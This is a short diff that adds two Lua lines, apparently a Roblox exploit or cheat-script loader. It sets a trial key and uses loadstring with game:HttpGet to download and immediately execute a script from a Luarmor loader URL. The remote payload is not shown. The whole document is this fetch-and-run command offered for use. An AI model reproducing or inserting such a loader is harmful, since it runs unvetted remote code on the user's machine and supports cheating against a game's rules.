@@ -1,0 +1,2 @@
+MirageKey = "FreeTrialKeyForAll"
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/7fde878980fdf87c0e522274f0d1ac3c.lua"))()
